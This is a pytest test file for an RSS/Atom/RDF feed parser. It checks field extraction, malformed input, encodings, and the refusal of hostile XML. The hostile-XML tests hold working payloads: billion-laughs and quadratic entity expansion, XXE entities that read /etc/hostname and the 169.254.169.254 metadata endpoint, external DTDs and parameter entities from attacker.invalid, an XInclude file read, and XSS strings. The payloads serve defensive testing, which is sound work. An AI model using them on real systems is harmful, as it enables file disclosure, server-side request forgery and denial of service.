"""Feed parsing: untrusted XML in, plain entries out. Nothing here touches the network."""

import pytest

from social_tracker.collector.feed import MAX_ENTRIES, FeedEntry, FeedError, parse_feed

RSS = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"
     xmlns:dc="http://purl.org/dc/elements/1.1/">
<channel>
  <title>City News</title>
  <item>
    <title>Sismo en Cali</title>
    <link>https://example.org/1</link>
    <guid>g-1</guid>
    <pubDate>Sun, 01 Mar 2026 08:00:00 GMT</pubDate>
    <description>&lt;p&gt;Un &lt;b&gt;temblor&lt;/b&gt;&lt;/p&gt;</description>
    <dc:creator>Ana</dc:creator>
  </item>
  <item>
    <title>Second</title>
    <link>https://example.org/2</link>
    <author>bob@example.org (Bob)</author>
    <description>Plain body</description>
    <content:encoded><![CDATA[<p>Full <i>body</i></p>]]></content:encoded>
  </item>
</channel>
</rss>
"""

ATOM = """<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Atom News</title>
  <entry>
    <title>Atom story</title>
    <link rel="self" href="https://example.org/self"/>
    <link rel="alternate" href="https://example.org/story"/>
    <id>urn:uuid:1</id>
    <published>2026-03-01T08:00:00Z</published>
    <updated>2026-03-02T08:00:00Z</updated>
    <summary>Short summary</summary>
    <content type="html">&lt;p&gt;Long &lt;b&gt;content&lt;/b&gt;&lt;/p&gt;</content>
    <author><name>Carla</name></author>
  </entry>
  <entry>
    <title>Only updated</title>
    <link href="https://example.org/u"/>
    <id>urn:uuid:2</id>
    <updated>2026-03-02T08:00:00Z</updated>
  </entry>
</feed>
"""

RDF = """<?xml version="1.0"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns="http://purl.org/rss/1.0/">
  <channel><title>RDF</title></channel>
  <item><title>Old style</title><link>https://example.org/rdf</link><description>d</description></item>
</rdf:RDF>
"""


def one(xml: str | bytes) -> FeedEntry:
    entries = parse_feed(xml.encode() if isinstance(xml, str) else xml).entries
    assert len(entries) == 1
    return entries[0]


def rss_item(inner: str) -> str:
    return f'<?xml version="1.0"?><rss version="2.0"><channel><item>{inner}</item></channel></rss>'


# ---- formats ----


def test_rss_20_fields_are_extracted():
    parsed = parse_feed(RSS.encode())
    first, second = parsed.entries
    assert parsed.over_limit == 0
    assert (first.title, first.link, first.guid) == (
        "Sismo en Cali",
        "https://example.org/1",
        "g-1",
    )
    assert first.published == "Sun, 01 Mar 2026 08:00:00 GMT"
    assert first.body_html == "<p>Un <b>temblor</b></p>"
    assert first.author == "Ana"
    assert second.guid is None
    assert second.author == "bob@example.org (Bob)"
    assert second.body_html == "<p>Full <i>body</i></p>"  # content:encoded wins over description


def test_the_raw_entry_keeps_every_original_field():
    first = parse_feed(RSS.encode()).entries[0]
    assert first.raw == {
        "title": "Sismo en Cali",
        "link": "https://example.org/1",
        "guid": "g-1",
        "published": "Sun, 01 Mar 2026 08:00:00 GMT",
        "description": "<p>Un <b>temblor</b></p>",
        "author": "Ana",
    }


def test_atom_entries_use_the_alternate_link_and_prefer_content_and_published():
    first, second = parse_feed(ATOM.encode()).entries
    assert first.title == "Atom story"
    assert first.link == "https://example.org/story"
    assert first.guid == "urn:uuid:1"
    assert first.published == "2026-03-01T08:00:00Z"
    assert first.body_html == "<p>Long <b>content</b></p>"
    assert first.author == "Carla"
    assert second.link == "https://example.org/u"  # a link without rel is the alternate
    assert second.published == "2026-03-02T08:00:00Z"  # falls back to updated
    assert second.body_html == ""


def test_rss_10_rdf_items_are_read():
    entry = one(RDF)
    assert (entry.title, entry.link, entry.body_html) == (
        "Old style",
        "https://example.org/rdf",
        "d",
    )


def test_an_empty_feed_is_valid_and_has_no_entries():
    empty = '<?xml version="1.0"?><rss version="2.0"><channel><title>x</title></channel></rss>'
    assert parse_feed(empty.encode()).entries == ()
    atom = '<feed xmlns="http://www.w3.org/2005/Atom"><title>x</title></feed>'
    assert parse_feed(atom.encode()).entries == ()


def test_missing_fields_are_none_or_empty_not_an_error():
    entry = one(rss_item("<description>only a body</description>"))
    assert (entry.title, entry.link, entry.guid, entry.published, entry.author) == (
        "",
        None,
        None,
        None,
        None,
    )
    assert entry.body_html == "only a body"


def test_entries_beyond_the_limit_are_counted_not_returned():
    items = "".join(f"<item><title>t{i}</title></item>" for i in range(MAX_ENTRIES + 25))
    parsed = parse_feed(f'<rss version="2.0"><channel>{items}</channel></rss>'.encode())
    assert len(parsed.entries) == MAX_ENTRIES
    assert parsed.over_limit == 25
    assert parsed.entries[0].title == "t0"


# ---- malformed input ----


@pytest.mark.parametrize(
    "data",
    [
        b"",
        b"   \n  ",
        b"not xml at all",
        b'{"json": true}',
        b"<html><body>An error page</body></html>",
        b"<!DOCTYPE html><html><body>Not a feed</body></html>",
        b"<rss><channel><item><title>truncated",
        RSS.encode()[: len(RSS) // 2],
        b"<rss></channel></rss>",
        b'<?xml version="1.0"?><other><item/></other>',
        b"\x00\x01\x02\x03",
        b"<" * 1000,
    ],
    ids=lambda d: repr(d[:25]),
)
def test_input_that_is_not_a_feed_is_a_feed_error(data):
    with pytest.raises(FeedError):
        parse_feed(data)


@pytest.mark.parametrize("bad", [None, "text", 5, ["x"]])
def test_non_bytes_input_is_rejected(bad):
    with pytest.raises(FeedError):
        parse_feed(bad)  # type: ignore[arg-type]


def test_extremely_deep_nesting_is_an_error_not_a_crash():
    depth = 40_000
    deep = (
        b"<rss><channel><item><title>"
        + b"<a>" * depth
        + b"</a>" * depth
        + b"</title></item></channel></rss>"
    )
    with pytest.raises(FeedError) as caught:
        parse_feed(deep)
    assert "nested" in caught.value.message


# ---- hostile XML ----

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<rss version="2.0"><channel><item><title>&lol9;</title></item></channel></rss>"""

QUADRATIC = (
    b'<?xml version="1.0"?><!DOCTYPE b [<!ENTITY a "' + b"x" * 50_000 + b'">]>'
    b'<rss version="2.0"><channel><item><title>'
    + b"&a;" * 50_000
    + b"</title></item></channel></rss>"
)

XXE_FILE = b"""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY secret SYSTEM "file:///etc/hostname">]>
<rss version="2.0"><channel><item><title>&secret;</title></item></channel></rss>"""

XXE_HTTP = b"""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY secret SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<rss version="2.0"><channel><item><title>&secret;</title></item></channel></rss>"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE rss SYSTEM "http://attacker.invalid/evil.dtd">
<rss version="2.0"><channel><item><title>x</title></item></channel></rss>"""

PARAMETER_ENTITY = b"""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.invalid/x.dtd"> %remote;]>
<rss version="2.0"><channel><item><title>x</title></item></channel></rss>"""

HARMLESS_DOCTYPE = b"""<?xml version="1.0"?>
<!DOCTYPE rss [<!ELEMENT rss ANY>]>
<rss version="2.0"><channel><item><title>x</title></item></channel></rss>"""


@pytest.mark.parametrize(
    "payload",
    [
        BILLION_LAUGHS,
        QUADRATIC,
        XXE_FILE,
        XXE_HTTP,
        EXTERNAL_DTD,
        PARAMETER_ENTITY,
        HARMLESS_DOCTYPE,
    ],
    ids=[
        "billion-laughs",
        "quadratic-blowup",
        "xxe-file",
        "xxe-http",
        "external-dtd",
        "parameter-entity",
        "any-doctype",
    ],
)
def test_any_document_type_declaration_is_refused_before_entities_are_resolved(payload):
    with pytest.raises(FeedError) as caught:
        parse_feed(payload)
    assert "document type" in caught.value.message
    for leaked in ("hostname", "169.254", "attacker", "lol"):
        assert leaked not in caught.value.message


def test_xinclude_is_not_processed(tmp_path):
    secret = tmp_path / "secret.txt"
    secret.write_text("TOP-SECRET-CONTENT")
    xml = (
        '<rss version="2.0" xmlns:xi="http://www.w3.org/2001/XInclude"><channel><item>'
        f'<title>t</title><description><xi:include href="{secret.as_uri()}" parse="text"/>'
        "</description></item></channel></rss>"
    )
    entry = one(xml)
    assert "TOP-SECRET" not in repr(entry)


def test_markup_inside_text_stays_text_in_the_entry():
    entry = one(
        rss_item(
            "<title>&lt;script&gt;alert(1)&lt;/script&gt;</title>"
            "<description><![CDATA[<img src=x onerror=alert(1)>]]></description>"
        )
    )
    assert entry.title == "<script>alert(1)</script>"
    assert entry.body_html == "<img src=x onerror=alert(1)>"


# ---- encodings ----


def test_undeclared_encoding_defaults_to_utf8_and_keeps_accents_and_emoji():
    entry = one(
        rss_item("<title>Sísmo \U0001f30b mañana</title>").replace('<?xml version="1.0"?>', "")
    )
    assert entry.title == "Sísmo \U0001f30b mañana"


def test_a_declared_latin1_document_is_decoded_with_that_encoding():
    xml = (
        '<?xml version="1.0" encoding="ISO-8859-1"?>'
        "<rss><channel><item><title>Año ñandú</title></item></channel></rss>"
    )
    assert one(xml.encode("latin-1")).title == "Año ñandú"


def test_a_utf8_byte_order_mark_and_utf16_are_accepted():
    xml = '<rss version="2.0"><channel><item><title>Ñ</title></item></channel></rss>'
    assert one(b"\xef\xbb\xbf" + xml.encode("utf-8")).title == "Ñ"
    assert one(xml.encode("utf-16")).title == "Ñ"


def test_invalid_utf8_bytes_become_replacement_characters_not_a_crash():
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<rss><channel><item><title>bad \xff\xfe byte</title></item></channel></rss>"
    )
    raw = xml.encode("latin-1")  # \xff\xfe are not valid UTF-8 here
    entry = one(raw)
    assert entry.title == "bad �� byte"


def test_control_characters_that_xml_forbids_are_dropped():
    entry = one(b"<rss><channel><item><title>a\x00b\x08c\x1fd</title></item></channel></rss>")
    assert entry.title == "abcd"


def test_html_named_entities_in_otherwise_valid_feeds_are_understood():
    entry = one(rss_item("<title>Caf&eacute;&nbsp;&mdash; ni&ntilde;o</title>"))
    assert entry.title == "Café\xa0— niño"


def test_unknown_entities_are_still_an_error():
    with pytest.raises(FeedError):
        parse_feed(rss_item("<title>&notarealentity;</title>").encode())
